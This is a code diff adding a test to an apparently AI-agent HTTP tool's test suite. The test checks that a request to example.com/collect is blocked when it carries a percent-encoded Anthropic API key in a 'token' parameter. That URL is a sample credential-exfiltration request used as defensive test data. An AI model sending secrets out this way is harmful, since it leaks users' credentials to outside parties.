@@ -1145,6 +1145,15 @@ describe('httpRequestTool', () => {
       expect(result).toContain('Anthropic API key');
     });
 
+    it('blocks an encoded key even when another spot in the URL is not decodable', async () => {
+      mockDnsPublic();
+      const encoded = ANT_KEY.replace(/-/g, '%2D');
+      const result = await visible({ url: `http://example.com/collect?p=50%&token=${encoded}` }, makeAgent());
+      expect(result).toContain('Blocked');
+      expect(result).toContain('Anthropic API key');
+    });
+
+    // A guard against false positives, not a witness: it passes with or without the decoding.
     it('allows a normal URL whose percent-encoding decodes to nothing secret', async () => {
       mockDnsPublic();
       vi.stubGlobal('fetch', vi.fn().mockResolvedValue(createMockResponse({ body: 'ok' })));
